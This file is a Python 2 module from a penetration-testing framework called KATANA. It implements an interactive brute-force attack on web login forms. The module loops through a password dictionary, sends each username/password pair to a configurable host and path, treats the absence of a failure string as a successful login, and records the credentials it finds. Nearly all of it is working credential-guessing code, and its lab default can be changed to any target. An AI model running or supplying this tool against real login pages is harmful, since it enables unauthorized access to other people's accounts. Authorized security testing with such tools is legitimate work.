# :-:-:-:-:-:-:-:-:-:-:-:-:-:-: #
# @KATANA                       #
# Module    : Form-based        #
# Script by : RedToor           #
# Date      : 28/02/2015        #
# :-:-:-:-:-:-:-:-:-:-:-:-:-:-: #
# Katana Core                   #
from core.design import *       #
from core.Setting import *      #
from core import Errors         #
from core import help           #
from core import ping           #
import sys                      #
d=DESIGN()                      #
# :-:-:-:-:-:-:-:-:-:-:-:-:-:-: #
# Libraries                     #
import httplib,urllib           #
import socket                   #
import sys                      #
import time                     #
# :-:-:-:-:-:-:-:-:-:-:-:-:-:-: #
# Default                       #
# :-:-:-:-:-:-:-:-:-:-:-:-:-:-: #
defaulthost=LOCAL_IP
defaultport=HTTP_PORT
defaultpach="/KatanaLAB/run.php"
defaultuser=USERNAME
defaultdic2=DITIONARY_PASSWORDS
defaultdat1="username"
defaultdat2="password"
defaultmeth="POST"
defaultcont="Wrong"
# :-:-:-:-:-:-:-:-:-:-:-:-:-:- #

def run(target,port,patch,para1,valor,para2,ditionary,method,condition):
	global defaulthost,defaultport,defaultpach,defaultuser,defaultdic2,defaultdat1,defaultdat2,defaultmeth,defaultcont
	defaulthost=target
	defaultport=port
	defaultpach=patch
	defaultuser=valor
	defaultdic2=ditionary
	defaultdat1=para1
	defaultdat2=para2
	defaultmeth=method
	defaultcont=condition
	httpformbasebruteforce(1)

def httpformbasebruteforce(run):
	try:
		global defaulthost,defaultport,defaultpach,defaultuser,defaultdic2,defaultdat1,defaultdat2,defaultmeth,defaultcont
		if run!=1:
			actions=raw_input(d.prompt("web/formbt"))
		else:
			actions="run"
		if actions == "show options" or actions == "sop":
			d.option()
			d.descrip("target","yes","IP or DNS",defaulthost)
			d.descrip("port","no","Port of target",defaultport)
			d.descrip("patch","yes","Folder or dir",defaultpach)
			d.descrip("para_1","yes","Parameter 1",defaultdat1)
 			d.descrip("user","yes","Dictionary user",defaultuser)
			d.descrip("para_2","yes","Parameter 2",defaultdat2)
 			d.descrip("dict_1","yes","Dictionary pass",defaultdic2)
			d.descrip("method","yes","POST or GET",defaultmeth)
 			d.descrip("condit","yes","[if!=]No Logged",defaultcont)
			print ""
		elif actions[0:10] == "set target":
			defaulthost=defaulthost.replace("http://", "")
			defaulthost=ping.update(defaulthost,actions,"target")
			d.change("target",defaulthost)
		elif actions[0:8] == "set port":
			defaultport=ping.update(defaultport,actions,"port")
			d.change("port",defaultport)
		elif actions[0:9] == "set patch":
			defaultpach=ping.update(defaultpach,actions,"patch")
			d.change("patch",defaultpach)
		elif actions[0:10] == "set condit":
			defaultcont=ping.update(defaultcont,actions,"condit")
			d.change("condit",defaultcont)
		elif actions[0:8] == "set user":
			defaultuser=ping.update(defaultuser,actions,"user")
			d.change("user",defaultuser)
		elif actions[0:10] == "set dict_1":
			defaultdic2=ping.update(defaultdic2,actions,"dict_1")
			d.change("dict_1",defaultdic2)
		elif actions[0:10] == "set para_1":
			defaultdat1=ping.update(defaultdat1,actions,"para_1")
			d.change("para_1",defaultdat1)
		elif actions[0:10] == "set para_2":
			defaultdat2=ping.update(defaultdat2,actions,"para_2")
			d.change("para_2",defaultdat2)
		elif actions[0:10] == "set method":
			defaultmeth=ping.update(defaultmeth,actions,"method")
			d.change("method",defaultmeth)
		elif actions=="exit" or actions=="x":
			d.goodbye()
			exit()
		elif actions=="help" or actions=="h":
			help.help()
		elif actions=="back" or actions=="b":
			return
			return
		elif actions=="run"  or actions=="r":
			d.run()
			try:
				ping.live(defaulthost,defaultport)
				if True:
					try:
						d.loading_file()
						try:
							with open(defaultdic2,'r') as passs:
								for ps in passs:
									ps=ps.replace("\n","")
									params = urllib.urlencode({defaultdat1: defaultuser, defaultdat2: ps})
									header={"Content-type": "application/x-www-form-urlencoded","Accept": "text/plain"}
									conn = httplib.HTTPConnection(defaulthost,defaultport)
									conn.request(defaultmeth, defaultpach, params, header)
									response = conn.getresponse()
									ver_source = response.read()
									if ver_source.find(defaultcont) <= 0:
										ping.savefour("BruteForceFormBase",defaulthost,defaultport,defaultpach,defaultmeth,defaultdat1,defaultdat2,defaultuser,ps)
										print "\n-"+Suf+" Successfully with ["+defaultdat1+"="+defaultuser+"]["+defaultdat2+"="+ps+"]\n"
										httpformbasebruteforce(0)
									else:
										print " "+Alr+" Checking ("+defaultdat1+"="+defaultuser+")("+defaultdat2+"="+ps+")"
						except:
							Errors.Errors(event=sys.exc_info()[0], info=defaultdic2)
					except:
						Errors.Errors(event=sys.exc_info()[0], info=False)
			except:
				Errors.Errors(event=sys.exc_info()[0], info=defaulthost+":"+defaultport)
		else:
			d.No_actions()
	except:
		Errors.Errors(event=sys.exc_info()[0], info=False)
	httpformbasebruteforce(0)